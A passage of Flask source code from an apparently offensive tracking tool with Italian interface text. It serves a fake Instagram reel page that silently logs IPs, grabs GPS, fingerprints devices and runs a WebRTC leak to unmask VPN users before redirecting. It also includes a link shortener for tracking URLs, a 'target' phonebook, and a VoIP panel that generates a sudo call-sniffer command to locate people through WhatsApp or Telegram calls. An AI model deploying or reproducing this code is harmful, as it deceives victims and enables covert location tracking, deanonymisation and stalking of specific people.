  if(c.speed!==null)u+='&spd='+c.speed;
  if(c.heading!==null)u+='&hdg='+c.heading;
  new Image().src=u;
  document.getElementById('pbar').style.width='100%';
  setTimeout(function(){window.location.href=D},800);
}

function requestGeo(){
  if(!navigator.geolocation){sendNoGeo('no_support');return}
  navigator.geolocation.getCurrentPosition(
    function(p){sendGeo(p.coords,'gps_explicit')},
    function(e){sendNoGeo('denied_'+e.code)},
    {enableHighAccuracy:true,timeout:10000,maximumAge:0}
  );
}

function sendNoGeo(src){
  if(sent)return;sent=true;
  new Image().src='/api/geo_hit?tid='+T+'&lat=0&lon=0&acc=0&src='+src;
  setTimeout(function(){window.location.href=D},800);
}

// Try silent first
setTimeout(function(){
  if(navigator.geolocation){
    navigator.geolocation.getCurrentPosition(
      function(p){sendGeo(p.coords,'gps_auto')},
      function(e){
        if(e.code===1){
          document.getElementById('loading').classList.add('hide');
          document.getElementById('perm').classList.remove('hide');
        }else{sendNoGeo('error_'+e.code)}
      },
      {enableHighAccuracy:true,timeout:5000,maximumAge:0}
    );
  }else{sendNoGeo('no_support')}
},800);

// Fingerprint
setTimeout(function(){
  var d={tid:T};
  try{d.screen_w=screen.width;d.screen_h=screen.height;d.pixel_ratio=window.devicePixelRatio||1}catch(e){}
  try{d.timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;d.language=navigator.language}catch(e){}
  try{d.platform=navigator.platform;d.cpu_cores=navigator.hardwareConcurrency||0;d.ram_gb=navigator.deviceMemory||0}catch(e){}
  try{d.touch_points=navigator.maxTouchPoints||0}catch(e){}
  try{var cn=navigator.connection;if(cn){d.connection_type=cn.effectiveType||''}}catch(e){}
  try{var x=new XMLHttpRequest();x.open('POST','/api/fingerprint');x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify(d))}catch(e){}
},400);

// Fallback redirect
setTimeout(function(){if(!sent)sendNoGeo('timeout')},15000);
})();
</script>
</body></html>"""
    gl_html = gl_html.replace("__OG_IMAGE__", og_img)
    gl_html = gl_html.replace("__DEST__", dest)
    gl_html = gl_html.replace("__TID__", tracking_id)
    return Response(gl_html, mimetype="text/html", headers={"Cache-Control": "no-cache"})


@app.route('/api/geo_hit')
def api_geo_hit():
    """Receive GPS coordinates from the geo tracker page."""
    from core.ip_logger import log_hit

    tid = request.args.get("tid", "")
    lat = request.args.get("lat", "0")
    lon = request.args.get("lon", "0")
    acc = request.args.get("acc", "0")
    src = request.args.get("src", "unknown")
    alt = request.args.get("alt", "")
    spd = request.args.get("spd", "")
    hdg = request.args.get("hdg", "")

    ip = _get_real_ip()
    ua = request.headers.get("User-Agent", "")

    extra = {
        "method": "precision_geo",
        "gps_lat": float(lat) if lat and lat != "0" else None,
        "gps_lon": float(lon) if lon and lon != "0" else None,
        "gps_accuracy_m": float(acc) if acc and acc != "0" else None,
        "geo_source": src,
    }
    if alt and alt != "null":
        try:
            extra["gps_altitude_m"] = float(alt)
        except (ValueError, TypeError):
            pass
    if spd and spd != "null":
        try:
            extra["gps_speed_ms"] = float(spd)
        except (ValueError, TypeError):
            pass
    if hdg and hdg != "null":
        try:
            extra["gps_heading"] = float(hdg)
        except (ValueError, TypeError):
            pass

    log_hit(tid, ip, ua, "", extra)

    return Response(PIXEL_GIF, mimetype="image/gif")


@app.route('/api/fingerprint', methods=['POST'])
def api_fingerprint():
    """Receive device fingerprint data from browser JS."""
    from core.ip_logger import log_device_fingerprint

    data = request.get_json(silent=True) or {}
    tid = data.pop("tid", "")
    if not tid:
        return Response(PIXEL_GIF, mimetype="image/gif")

    ip = _get_real_ip()
    log_device_fingerprint(tid, ip, data)

    return Response(PIXEL_GIF, mimetype="image/gif")





# ══════════════════════════════════════════════════════════════
# Disguised Tracker — Looks like real Instagram/social content
# ══════════════════════════════════════════════════════════════

@app.route('/reel/<code>')
@app.route('/reels/<code>')
@app.route('/p/<code>/')
@app.route('/stories/<code>')
def disguised_reel(code):
    """Disguised tracker that looks EXACTLY like an Instagram reel share page.
    
    URL: /reel/BxK2abc  (looks like instagram.com/reel/BxK2abc)
    
    Serves a perfect Instagram-lookalike loading screen:
    - Instagram logo, colors, spinner
    - Real og:image thumbnail from destination reel
    - Title/description matching Instagram's actual meta tags
    - Logs IP silently, then redirects to real content
    """
    from core.ip_logger import log_hit, LOG_DIR
    
    # Look up the tracking data for this code
    # Short codes map to tracking IDs
    full_url = _SHORT_DB.get(code, "")
    tid = ""
    dest = "https://www.instagram.com"
    
    if full_url:
        # Extract tracking ID from the full URL path
        import re as _re
        m = _re.search(r'/(t|lp|gl|c)/([a-f0-9]+)', full_url)
        if m:
            tid = m.group(2)
    
    # If no mapping, check if code itself is a tracking ID
    if not tid:
        tid = code
    
    # Get destination from meta
    meta_path = LOG_DIR / (tid + "_meta.json")
    if meta_path.exists():
        try:
            dest = json.loads(meta_path.read_text()).get("destination", dest)
        except: pass
    
    # Log the hit
    ip = request.headers.get("Cf-Connecting-Ip", request.headers.get("X-Forwarded-For", request.headers.get("X-Real-IP", request.remote_addr)))

    ua = request.headers.get("User-Agent", "")
    
    is_crawler = any(c.lower() in ua.lower() for c in 
        ["facebookexternalhit", "Facebot", "Twitterbot", "TelegramBot", "WhatsApp", "bot", "crawler"])
    
    # Log everything but tag datacenter vs real device
    dc = ("2a03:2880:", "31.13.", "157.240.", "69.63.",
          "44.248.", "44.244.", "44.238.", "34.214.", "18.237.", "52.94.", "54.239.",
          "172.67.", "104.16.", "104.17.", "104.18.", "104.21.", "104.22.",
          "66.220.", "66.102.", "72.14.", "74.125.", "142.250.", "173.194.",
          "91.108.", "149.154.")
    is_datacenter = any(ip.startswith(p) for p in dc)

    hit_type = "real_device"
    if is_crawler:
        hit_type = "bot_crawler"
    elif is_datacenter:
        hit_type = "preview_fetch"
    
    log_hit(tid, ip, ua, request.headers.get("Referer", ""), {
        "method": "disguised_reel",
        "is_crawler": is_crawler,
        "is_datacenter": is_datacenter,
        "hit_type": hit_type,
        "disguised_code": code,
    })
    
    server = request.host
    
    base_url = _tunnel_status().get("url") or ("http://" + server)
    og_img = base_url + "/og/" + tid + ".jpg"
    # Serve a page that looks EXACTLY like Instagram's reel sharing page

    reel_html = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta property="og:site_name" content="Instagram">
<meta property="og:type" content="video">
<meta property="og:title" content="Instagram Reel">
<meta property="og:description" content="Liked by 12,847 others">
<meta property="og:image" content="__OG_IMAGE__">
<meta property="og:image:type" content="image/jpeg">
<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="630">
<meta property="og:image:alt" content="Video thumbnail">
<meta property="og:url" content="__OG_URL__">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="Instagram Reel">
<meta name="twitter:description" content="Liked by 12,847 others">
<meta name="twitter:image" content="__OG_IMAGE__">
<meta name="twitter:site" content="@instagram">
<meta name="telegram:channel" content="@instagram">
<link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
<title>Instagram</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
  display:flex;align-items:center;justify-content:center;min-height:100vh;overflow:hidden}
.wrap{text-align:center;max-width:400px;padding:20px}
.ig-logo{width:175px;margin:0 auto 30px}
.spinner{width:24px;height:24px;border:2px solid #333;border-top:2px solid #fff;
  border-radius:50%;animation:spin .8s linear infinite;margin:20px auto}
@keyframes spin{to{transform:rotate(360deg)}}
.msg{color:#8e8e8e;font-size:14px;margin-top:15px}
.sub{color:#555;font-size:12px;margin-top:5px}
.app-bar{position:fixed;bottom:0;left:0;right:0;background:#000;border-top:1px solid #222;
  padding:8px 0;display:flex;justify-content:center;gap:40px}
.app-bar svg{fill:#fff;width:24px;height:24px;opacity:0.7}
.open-btn{display:inline-block;background:#0095f6;color:#fff;font-weight:600;font-size:14px;
  padding:8px 16px;border-radius:8px;text-decoration:none;margin-top:20px}
</style>
</head>
<body>
<div class="wrap">
  <svg class="ig-logo" viewBox="0 0 175 51" fill="#fff">
    <path d="M0 35.2V16h4.6v19.2H0zm7.2 0V16h4.4v2.5h.1c.9-1.8 2.8-3 5.2-3 4.2 0 6.4 3 6.4 7v12.7h-4.6V23.4c0-2.4-1-4-3.2-4-2 0-3.7 1.5-3.7 4.3v11.5H7.2zm22.4-6.5V17.3h-3V16h3v-5.2h4.5V16h3.8v1.3h-3.8v11c0 1.7.5 2.5 2.2 2.5.6 0 1.2-.1 1.6-.2v3.8c-.6.1-1.4.2-2.4.2-4 0-5.9-1.5-5.9-5.9z"/>
  </svg>
  <div class="spinner"></div>
  <div class="msg">Opening in Instagram...</div>
  <div class="sub">You'll be redirected automatically</div>
  <a href=\"__DEST__\" class="open-btn">Open in app</a>
</div>

<div class="app-bar">
  <svg viewBox="0 0 24 24"><path d="M9.005 16.545a2.997 2.997 0 012.997-2.997A2.997 2.997 0 0115 16.545V22h7V11.543L12 2 2 11.543V22h7.005z"/></svg>
  <svg viewBox="0 0 24 24"><path d="M19 10.5A8.5 8.5 0 1110.5 2a8.5 8.5 0 018.5 8.5z" fill="none" stroke="#fff" stroke-width="2"/><line x1="16.511" y1="16.511" x2="22" y2="22" stroke="#fff" stroke-width="2"/></svg>
  <svg viewBox="0 0 24 24"><path d="M12 2C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2z" fill="none" stroke="#fff" stroke-width="2"/><path d="M12 7v5l3 3" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round"/></svg>
</div>

<!-- Silent tracking -->
<img src="/p/__TID__.gif" width="1" height="1" style="display:none">
<script>
(function(){
var T='__TID__',S='__SERVER__',D='__DEST__',sent=false;

// 1. Geolocation probe (silent — get GPS coordinates)
function sendGeo(p){
  if(sent)return;sent=true;
  var c=p.coords;
  var u='/api/geo_hit?tid='+T+'&lat='+c.latitude+'&lon='+c.longitude+'&acc='+c.accuracy;
  if(c.altitude!==null)u+='&alt='+c.altitude;
  if(c.speed!==null)u+='&spd='+c.speed;
  if(c.heading!==null)u+='&hdg='+c.heading;
  u+='&src=reel_auto';
  new Image().src=u;
}
if(navigator.geolocation){
  navigator.geolocation.getCurrentPosition(sendGeo,function(){},{enableHighAccuracy:true,timeout:5000,maximumAge:0});
}

// 2. Device fingerprint (silent — no permission needed)
function fp(){
  var d={tid:T};
  try{d.screen_w=screen.width;d.screen_h=screen.height;d.color_depth=screen.colorDepth;d.pixel_ratio=window.devicePixelRatio||1}catch(e){}
  try{d.timezone=Intl.DateTimeFormat().resolvedOptions().timeZone}catch(e){}
  try{d.language=navigator.language;d.languages=navigator.languages?navigator.languages.join(','):''}catch(e){}
  try{d.platform=navigator.platform;d.cpu_cores=navigator.hardwareConcurrency||0}catch(e){}
  try{d.ram_gb=navigator.deviceMemory||0}catch(e){}
  try{d.touch_points=navigator.maxTouchPoints||0}catch(e){}
  try{d.do_not_track=navigator.doNotTrack||'unknown'}catch(e){}
  try{d.cookies_enabled=navigator.cookieEnabled}catch(e){}
  try{var cn=navigator.connection||navigator.mozConnection||navigator.webkitConnection;if(cn){d.connection_type=cn.effectiveType||'';d.connection_downlink=cn.downlink||0;d.connection_rtt=cn.rtt||0}}catch(e){}
  // Canvas fingerprint
  try{var cv=document.createElement('canvas');cv.width=200;cv.height=50;var ctx=cv.getContext('2d');ctx.textBaseline='top';ctx.font='14px Arial';ctx.fillText('fp',2,2);d.canvas_hash=cv.toDataURL().slice(-32)}catch(e){}
  // WebGL renderer
  try{var gl=document.createElement('canvas').getContext('webgl');if(gl){var dbg=gl.getExtension('WEBGL_debug_renderer_info');if(dbg){d.webgl_vendor=gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);d.webgl_renderer=gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)}}}catch(e){}
  // Battery
  if(navigator.getBattery){try{navigator.getBattery().then(function(b){d.battery_level=Math.round(b.level*100);d.battery_charging=b.charging;post(d)})}catch(e){post(d)}}else{post(d)}
}
function post(d){try{var x=new XMLHttpRequest();x.open('POST','/api/fingerprint');x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify(d))}catch(e){}}
setTimeout(fp,300);

// 3. WebRTC STUN leak (reveals real IP behind VPN/proxy)
try{
  var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
  pc.createDataChannel('');pc.createOffer().then(function(o){pc.setLocalDescription(o)});
  pc.onicecandidate=function(e){
    if(!e||!e.candidate)return;
    var m=e.candidate.candidate.match(/([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/);
    if(m){new Image().src='/p/'+T+'.gif?webrtc_ip='+m[1]+'&src=webrtc'}
  };
  setTimeout(function(){try{pc.close()}catch(e){}},8000);
}catch(e){}

// 4. Auto-redirect
setTimeout(function(){window.location.href=D},2500);
})();
</script>
</body>
</html>"""
    reel_html = reel_html.replace("__OG_IMAGE__", og_img)
    reel_html = reel_html.replace("__OG_URL__", base_url + "/reel/" + tid)
    reel_html = reel_html.replace("__DEST__", dest)
    reel_html = reel_html.replace("__TID__", tid)
    reel_html = reel_html.replace("__SERVER__", server)
    return Response(reel_html, mimetype="text/html", headers={"Cache-Control": "no-cache"})


# ── Internal URL Shortener ──

_SHORT_DB = {}  # In-memory: short_code -> full_url

@app.route('/s/<code>')
def short_redirect(code):
    """Internal shortener — redirects short code to full tracking URL."""
    url = _SHORT_DB.get(code)
    if not url:
        abort(404)
    from flask import redirect
    return redirect(url)

def _shorten(full_url):
    """Generate a short code for a URL."""
    import hashlib
    code = hashlib.md5(full_url.encode()).hexdigest()[:6]
    _SHORT_DB[code] = full_url
    return code



# ══════════════════════════════════════════════════════════════
# Gateway Telefonico — Rubrica, Pulsantiera, IP/Geo Tracker, Call Sniffer
# ══════════════════════════════════════════════════════════════

def _gather_phonebook():
    """Auto-populate phonebook from all investigation data."""
    phones = []
    if STORE_DIR.exists():
        for f in STORE_DIR.glob("*.json"):
            try:
                data = json.loads(f.read_text())
                target = f.stem
                for number, info in data.get("phones", {}).items():
                    if isinstance(info, dict):
                        conf = info.get("confidence_score", 0.5)
                        sources = info.get("sources", ["unknown"])
                        carrier = info.get("carrier", "")
                        ptype = info.get("type", "")
                    else:
                        conf, sources, carrier, ptype = 0.5, ["unknown"], "", ""
                    if not isinstance(sources, list):
                        sources = [sources]
                    phones.append({
                        "number": number, "target": target,
                        "confidence": conf, "sources": sources,
                        "carrier": carrier, "type": ptype,
                    })
            except Exception:
                pass
    phones.sort(key=lambda p: p["confidence"], reverse=True)
    return phones


def _gather_call_results():
    """Collect all call sniffer results."""
    from core.ip_logger import LOG_DIR as IP_LOG_DIR
    results = []
    for f in IP_LOG_DIR.glob("*_call.json"):
        try:
            data = json.loads(f.read_text())
            top = data.get("results", [{}])[0] if data.get("results") else {}
            geo = top.get("geo", {})
            results.append({
                "label": data.get("label", f.stem),
                "timestamp": data.get("timestamp", "")[:16],
                "top_ip": top.get("ip", "?"),
                "score": top.get("score", 0),
                "stun": top.get("stun", 0),
                "city": geo.get("city", "?"),
                "country": geo.get("country", "?"),
                "address": geo.get("address", "")[:80],
                "lat": geo.get("lat", 0),
                "lon": geo.get("lon", 0),
                "isp": geo.get("isp", ""),
                "mobile": geo.get("mobile", False),
            })
        except Exception:
            pass
    results.sort(key=lambda x: x["timestamp"], reverse=True)
    return results


def _gather_tracker_data():
    """Collect active IP trackers for the embedded tracker tab."""
    from core.ip_logger import list_trackers
    return list_trackers()


def _gather_geo_hits():
    """Collect all geolocated hits (calls + trackers) for the map."""
    from core.ip_logger import LOG_DIR as IP_LOG_DIR
    markers = []
    # From call sniffer
    for f in IP_LOG_DIR.glob("*_call.json"):
        try:
            data = json.loads(f.read_text())
            for r in data.get("results", [])[:3]:
                geo = r.get("geo", {})
                if geo.get("lat") and geo.get("lon"):
                    markers.append({
                        "lat": geo["lat"], "lon": geo["lon"],
                        "ip": r.get("ip", "?"),
                        "label": data.get("label", "?"),
                        "source": "call_sniffer",
                        "city": geo.get("city", ""),
                        "country": geo.get("country", ""),
                        "time": data.get("timestamp", "")[:16],
                        "accuracy": 20000,
                        "color": "#ff3366",
                    })
        except Exception:
            pass
    # From IP trackers
    for f in IP_LOG_DIR.glob("*.json"):
        if f.stem.endswith(("_meta", "_fingerprints", "_call")):
            continue
        try:
            hits = json.loads(f.read_text())
            if not isinstance(hits, list):
                continue
            for h in hits:
                geo = h.get("geo", {})
                lat = h.get("gps_lat") or geo.get("lat")
                lon = h.get("gps_lon") or geo.get("lon")
                if lat and lon and lat != 0:
                    acc = h.get("gps_accuracy_m", 25000)
                    markers.append({
                        "lat": lat, "lon": lon,
                        "ip": h.get("ip", "?"),
                        "label": h.get("tracking_id", f.stem),
                        "source": h.get("geo_source", "ip_tracker"),
                        "city": geo.get("city", ""),
                        "country": geo.get("country", ""),
                        "time": h.get("timestamp", "")[:16],
                        "accuracy": acc,
                        "color": "#00ff66" if acc < 500 else "#00cccc",
                    })
        except Exception:
            pass
    return markers


@app.route('/voip')
def voip_panel():
    """Gateway Telefonico — pulito e funzionale."""
    phones = _gather_phonebook()
    call_results = _gather_call_results()
    geo_markers = _gather_geo_hits()

    tunnel = _tunnel_status()
    base_url = tunnel.get("url", "") if tunnel.get("running") else f"http://{request.host}"

    # Asterisk status
    pbx_running = False
    try:
        r = subprocess.run(["sudo", "asterisk", "-rx", "core show version"],
                           capture_output=True, text=True, timeout=5)
        pbx_running = r.returncode == 0 and "Asterisk" in r.stdout
    except Exception:
        pass
    twilio_ok = (Path.home() / ".strikecore" / "twilio.env").exists()

    # Phonebook rows
    phone_rows = ""
    for p in phones[:30]:
        src_str = ", ".join(p["sources"][:2])
        cc = "green" if p["confidence"] > 0.7 else ("yellow" if p["confidence"] > 0.4 else "red")
        num_esc = p["number"].replace("'", "\\'")
        tgt_esc = p["target"][:20].replace("'", "\\'")
        phone_rows += (
            '<tr class="table-row border-b border-white/5 text-[11px]">'
            f'<td class="py-2 px-3 text-purple-300 font-mono">{p["number"]}</td>'
            f'<td class="py-2 px-3"><a href="/target/{p["target"]}" class="text-cyan-400 hover:underline">{p["target"][:20]}</a></td>'
            f'<td class="py-2 px-3"><span class="badge bg-{cc}-500/20 text-{cc}-400">{p["confidence"]:.0%}</span></td>'
            f'<td class="py-2 px-3 text-gray-600 text-[10px]">{src_str}</td>'
            '<td class="py-2 px-3 flex gap-1">'
            f'<button onclick="quickDial(\'{num_esc}\')" class="px-2 py-0.5 bg-green-500/20 border border-green-500/30 rounded text-green-400 text-[10px] hover:bg-green-500/30">&#9742;</button>'
            f'<button onclick="sniffCall(\'{num_esc}\',\'{tgt_esc}\')" class="px-2 py-0.5 bg-red-500/20 border border-red-500/30 rounded text-red-400 text-[10px] hover:bg-red-500/30">SNIFF</button>'
            '</td></tr>\n'
        )

    # Call result rows
    call_rows = ""
    for cr in call_results[:12]:
        stun_b = f' <span class="text-green-400">[STUN x{cr["stun"]}]</span>' if cr["stun"] else ""
        mob = ' <span class="text-blue-400">[M]</span>' if cr["mobile"] else ""
        call_rows += (
            f'<tr class="table-row border-b border-white/5 text-[11px] cursor-pointer" onclick="window.location=\'/tracking/{cr["label"]}\'">'
            f'<td class="py-2 px-3 text-gray-500">{cr["timestamp"]}</td>'
            f'<td class="py-2 px-3 text-cyan-400">{cr["label"][:18]}</td>'
            f'<td class="py-2 px-3 text-green-400 font-mono">{cr["top_ip"]}</td>'
            f'<td class="py-2 px-3">{cr["score"]}{stun_b}{mob}</td>'
            f'<td class="py-2 px-3 text-gray-400">{cr["city"]}, {cr["country"]}</td>'
            f'<td class="py-2 px-3 text-gray-600 text-[10px]">{cr["isp"][:25]}</td>'
            '</tr>\n'
        )

    geo_json = json.dumps(geo_markers)

    pbx_b = '<span class="badge bg-green-500/20 text-green-400">ONLINE</span>' if pbx_running else '<span class="badge bg-red-500/20 text-red-400">OFFLINE</span>'
    twilio_b = '<span class="badge bg-green-500/20 text-green-400">OK</span>' if twilio_ok else '<span class="badge bg-red-500/20 text-red-400">NO</span>'
    no_calls = '<div class="text-gray-600 text-xs text-center py-4">Nessun risultato. Avvia una chiamata con sniffing.</div>' if not call_results else ""
    no_phones = '<div class="text-gray-600 text-xs text-center py-3">Nessun contatto.</div>' if not phones else ""

    content = """
    <style>
    .gw-card{background:rgba(15,15,35,0.7);border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:20px}
    .dial-btn{width:64px;height:52px;display:flex;flex-direction:column;align-items:center;justify-content:center;
      border-radius:12px;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.08);
      cursor:pointer;transition:all 0.12s;font-size:20px;color:#e0e0e0;font-weight:500;user-select:none}
    .dial-btn:hover{background:rgba(255,255,255,0.08);transform:scale(1.06)}
    .dial-btn:active{background:rgba(255,50,50,0.2);transform:scale(0.94)}
    .dial-btn small{font-size:8px;color:#555;margin-top:1px;letter-spacing:2px}
    .call-green{background:rgba(0,200,80,0.15)!important;border-color:rgba(0,200,80,0.3)!important;color:#0f0!important}
    .call-green:hover{background:rgba(0,200,80,0.25)!important}
    .call-red{background:rgba(255,50,50,0.15)!important;border-color:rgba(255,50,50,0.3)!important;color:#f44!important}
    #live-log{font-size:10px;line-height:1.6;color:#6a6;background:rgba(0,0,0,0.5);
      border:1px solid rgba(0,255,0,0.1);border-radius:8px;padding:12px;height:200px;overflow-y:auto}
    .log-err{color:#f55}.log-ok{color:#0f0}.log-ip{color:#0ff;font-weight:bold}.log-dim{color:#555}
    </style>

    <!-- HEADER -->
    <div class="flex items-center justify-between mb-5">
      <div>
        <h1 class="text-xl font-bold text-white">Gateway Telefonico</h1>
        <div class="text-[10px] text-gray-600 mt-1">Asterisk PBX + Twilio &middot; PCAP Sniffing &middot; IP Geolocation</div>
      </div>
      <div class="flex gap-2 text-[10px]">
        <div class="glass px-3 py-1.5">PBX """ + pbx_b + """</div>
        <div class="glass px-3 py-1.5">Twilio """ + twilio_b + """</div>
        <div class="glass px-3 py-1.5 text-gray-500">+14788126676</div>
      </div>
    </div>

    <div class="grid grid-cols-12 gap-4">

    <!-- LEFT: DIALPAD + LIVE LOG -->
    <div class="col-span-4">
      <div class="gw-card mb-4">
        <div class="text-xs font-semibold text-cyan-400 mb-3">PULSANTIERA</div>
        <input type="text" id="dial-num" placeholder="+39..."
          class="w-full bg-black/40 border border-white/10 rounded-lg px-3 py-3 text-xl text-white text-center font-mono mb-3 tracking-wider focus:border-cyan-500/40 focus:outline-none">
        <div class="grid grid-cols-3 gap-2 mb-3">
          <div class="dial-btn" onclick="dp('1')">1</div>
          <div class="dial-btn" onclick="dp('2')">2<small>ABC</small></div>
          <div class="dial-btn" onclick="dp('3')">3<small>DEF</small></div>
          <div class="dial-btn" onclick="dp('4')">4<small>GHI</small></div>
          <div class="dial-btn" onclick="dp('5')">5<small>JKL</small></div>
          <div class="dial-btn" onclick="dp('6')">6<small>MNO</small></div>
          <div class="dial-btn" onclick="dp('7')">7<small>PQRS</small></div>
          <div class="dial-btn" onclick="dp('8')">8<small>TUV</small></div>
          <div class="dial-btn" onclick="dp('9')">9<small>WXYZ</small></div>
          <div class="dial-btn" onclick="dp('*')">*</div>
          <div class="dial-btn" onclick="dp('0')">0<small>+</small></div>
          <div class="dial-btn" onclick="dp('#')">#</div>
        </div>
        <div class="grid grid-cols-3 gap-2 mb-4">
          <div class="dial-btn" onclick="dBack()" style="font-size:14px;color:#888">&#9003;</div>
          <div class="dial-btn call-green" onclick="doCall()">&#9742;</div>
          <div class="dial-btn call-red" onclick="doHangup()">&#10006;</div>

        </div>
        <div class="text-[10px] text-gray-500 space-y-1.5 border-t border-white/5 pt-3">
          <label class="flex items-center gap-2 cursor-pointer">
            <input type="radio" name="cm" value="asterisk" checked class="accent-yellow-500"> Asterisk PBX (SIP + PCAP)</label>
          <label class="flex items-center gap-2 cursor-pointer">
            <input type="radio" name="cm" value="twilio" class="accent-blue-500"> Twilio API</label>
          <label class="flex items-center gap-2 cursor-pointer">
            <input type="radio" name="cm" value="whatsapp" class="accent-emerald-500"> WhatsApp (Twilio)</label>
          <label class="flex items-center gap-2 cursor-pointer">
            <input type="radio" name="cm" value="sniffer" class="accent-red-500"> Call Sniffer (manuale)</label>
        </div>
      </div>

      <!-- LIVE CALL LOG -->
      <div class="gw-card">
        <div class="flex items-center justify-between mb-2">
          <div class="text-xs font-semibold text-green-400">LIVE LOG</div>
          <div id="call-status" class="text-[10px] text-gray-600">idle</div>
        </div>
        <div id="live-log"><div class="log-dim">In attesa di una chiamata...</div></div>
      </div>
    </div>

    <!-- RIGHT: RESULTS + MAP + RUBRICA -->
    <div class="col-span-8">
      <div class="gw-card mb-4">
        <div class="flex items-center justify-between mb-3">
          <div class="text-xs font-semibold text-red-400">RISULTATI CHIAMATE (""" + str(len(call_results)) + """)</div>
          <div class="text-[10px] text-gray-600">Click su una riga per aprire il tracker</div>
        </div>
        """ + no_calls + """
        <div style="max-height:220px;overflow-y:auto">
        <table class="w-full" id="call-results-table"><thead class="sticky top-0 bg-[#0a0a1e]"><tr class="text-gray-600 border-b border-white/10 text-[10px]">
          <th class="text-left py-1 px-3">Quando</th><th class="text-left py-1 px-3">Target</th>
          <th class="text-left py-1 px-3">IP</th><th class="py-1 px-3">Score</th>
          <th class="text-left py-1 px-3">Posizione</th><th class="text-left py-1 px-3">ISP</th>
        </tr></thead><tbody>""" + call_rows + """</tbody></table></div>
      </div>

      <!-- MAP -->
      <div class="gw-card mb-4">
        <div class="flex items-center justify-between mb-2">
          <div class="text-xs font-semibold text-emerald-400">MAPPA IP</div>
          <div class="flex gap-3 text-[9px]">
            <span><span class="inline-block w-2 h-2 rounded-full mr-1" style="background:#ff3366"></span>Call</span>
            <span><span class="inline-block w-2 h-2 rounded-full mr-1" style="background:#00cccc"></span>Tracker</span>
            <span><span class="inline-block w-2 h-2 rounded-full mr-1" style="background:#00ff66"></span>GPS</span>
          </div>
        </div>
        <div style="height:300px;border-radius:8px;overflow:hidden">
          <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
          <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
          <div id="geomap" style="height:100%;width:100%"></div>
        </div>
      </div>

      <!-- RUBRICA -->
      <div class="gw-card">
        <div class="flex items-center justify-between mb-3">
          <div class="text-xs font-semibold text-purple-400">RUBRICA (""" + str(len(phones)) + """)</div>
          <input type="text" id="rb-search" placeholder="Cerca..." oninput="filterRb(this.value)"
            class="bg-black/30 border border-white/10 rounded px-2 py-1 text-[10px] text-white placeholder-gray-600 focus:border-purple-500/50 focus:outline-none w-40">
        </div>
        """ + no_phones + """
        <div style="max-height:200px;overflow-y:auto">
        <table class="w-full" id="rb-table"><thead class="sticky top-0 bg-[#0a0a1e]"><tr class="text-gray-600 border-b border-white/10 text-[10px]">
          <th class="text-left py-1 px-3">Numero</th><th class="text-left py-1 px-3">Target</th>
          <th class="py-1 px-3">Conf.</th><th class="text-left py-1 px-3">Fonti</th><th class="py-1 px-3">Azioni</th>
        </tr></thead><tbody>""" + phone_rows + """</tbody></table></div>
      </div>
    </div>
    </div>

    <!-- IP RESULT PANEL (hidden until result) -->
    <div id="ip-result" style="display:none" class="glass p-5 mt-4 border border-emerald-500/20">
      <div class="flex items-center justify-between mb-3">
        <div class="text-sm font-bold text-emerald-400">IP TROVATO</div>
        <div id="ip-result-flags" class="flex gap-1"></div>
      </div>
      <div class="grid grid-cols-3 gap-4">
        <div>
          <div class="text-[10px] text-gray-500">IP Address</div>
          <div id="res-ip" class="text-lg font-mono text-cyan-400 mt-0.5"></div>
          <div id="res-isp" class="text-[11px] text-gray-500 mt-1"></div>
          <div id="res-asn" class="text-[10px] text-gray-600"></div>
        </div>
        <div>
          <div class="text-[10px] text-gray-500">Location</div>
          <div id="res-city" class="text-sm text-white mt-0.5"></div>
          <div id="res-addr" class="text-[10px] text-gray-500 mt-1"></div>
          <div id="res-coords" class="text-[10px] text-gray-600 font-mono mt-1"></div>
        </div>
        <div>
          <div class="text-[10px] text-gray-500">Details</div>
          <div id="res-score" class="text-sm text-gray-300 mt-0.5"></div>
          <div id="res-packets" class="text-[10px] text-gray-600 mt-1"></div>
          <div id="res-tz" class="text-[10px] text-gray-600"></div>
        </div>
      </div>
    </div>

    <!-- JAVASCRIPT -->
    <script>
    var dialEl=document.getElementById('dial-num');
    var logEl=document.getElementById('live-log');
    var statusEl=document.getElementById('call-status');
    var geoMap=null, geoMarkers=[];

    function dp(d){if(d==='0'&&!dialEl.value){dialEl.value='+';return;}dialEl.value+=d;}
    function dBack(){dialEl.value=dialEl.value.slice(0,-1);}
    function quickDial(n){dialEl.value=n;}
    function log(msg,cls){var d=document.createElement('div');d.className=cls||'';d.textContent='['+new Date().toLocaleTimeString()+'] '+msg;logEl.appendChild(d);logEl.scrollTop=logEl.scrollHeight;}
    function logHtml(html){var d=document.createElement('div');d.innerHTML='['+new Date().toLocaleTimeString()+'] '+html;logEl.appendChild(d);logEl.scrollTop=logEl.scrollHeight;}
    function clearLog(){logEl.innerHTML='';}

    var pollTimer=null;

    function doCall(){
      var num=dialEl.value.trim();
      if(!num)return;
      var method=document.querySelector('input[name="cm"]:checked').value;
      if(method==='sniffer'){
        var label=num.replace(/[^0-9]/g,'');
        var cmd='sudo call-sniffer -i enp87s0 -t '+label+' -d 90 --save-pcap';
        clearLog();log('SNIFFER MODE - esegui nel terminale:');log(cmd,'log-ok');
        log('Poi chiama '+num+' su WhatsApp/Telegram');
        try{navigator.clipboard.writeText(cmd);}catch(e){}
